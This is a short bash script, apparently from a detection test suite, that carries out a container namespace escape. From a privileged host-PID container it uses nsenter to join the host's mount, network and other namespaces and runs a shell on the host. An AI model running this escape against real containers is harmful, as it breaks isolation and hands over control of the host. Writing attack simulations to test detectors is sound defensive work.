#!/bin/bash
# ATTACK 5 — Namespace Escape
# A --privileged --pid=host container uses nsenter/setns to join
# host namespaces (mount, net, pid, uts, ipc) and break all isolation.
# Does NOT read credential files (that's attack 4).
set -e

echo "=== ATTACK 5: Namespace Escape ==="
echo "PID: $$  Container: $(hostname)"
CONTAINER_HOSTNAME=$(hostname)
echo ""

# Check prerequisites
if [ ! -r "/proc/1/ns/mnt" ]; then
    echo "[-] /proc/1/ns/ not accessible — PID namespace is isolated"
    exit 1
fi
echo "[+] /proc/1/ns/ accessible — can join host namespaces"

# Step 1: Enumerate host namespaces
echo "[*] Host namespaces at /proc/1/ns/:"
for ns in mnt pid net uts ipc; do
    echo "    $ns → $(readlink /proc/1/ns/$ns 2>/dev/null)"
done

# Step 2: nsenter into host mount namespace
echo "[*] nsenter -t 1 -m -- hostname"
HOST=$(nsenter -t 1 -m -- hostname 2>/dev/null)
[ -n "$HOST" ] && echo "[!] ESCAPED — host hostname: $HOST"

# Step 3: nsenter into host network namespace
echo "[*] nsenter -t 1 -n -- cat /proc/net/tcp | head -3"
NET=$(nsenter -t 1 -n -- cat /proc/net/tcp 2>/dev/null | head -3)
[ -n "$NET" ] && echo "[!] ESCAPED — can see host network connections"

# Step 4: Full namespace escape (all namespaces at once)
echo "[*] nsenter -t 1 -m -u -i -n -p -- whoami && hostname"
FULL=$(nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'echo "user=$(whoami) host=$(hostname)"' 2>/dev/null)
[ -n "$FULL" ] && echo "[!] FULL ESCAPE — $FULL"

echo ""
echo "=== Attack complete — check detector for NAMESPACE-ESCAPE alerts ==="
